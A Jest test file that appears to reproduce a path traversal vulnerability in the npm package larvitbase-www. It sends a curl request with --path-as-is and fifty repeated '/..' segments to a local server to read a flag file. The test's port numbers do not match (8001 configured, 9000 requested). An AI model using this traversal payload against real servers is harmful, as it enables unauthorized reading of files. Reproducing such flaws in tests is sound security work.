const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in larvitbase-www", (done) => {
  const App = require("larvitbase-www");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let app;

  app = new App({
    baseOptions: { httpOptions: 8001 }, // sent to larvitbase
    routerOptions: {}, // sent to larvitrouter
    reqParserOptions: {}, // sent to larvitpeqparser
  });

  app.start(function (err) {
    if (err) throw err;
  });

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
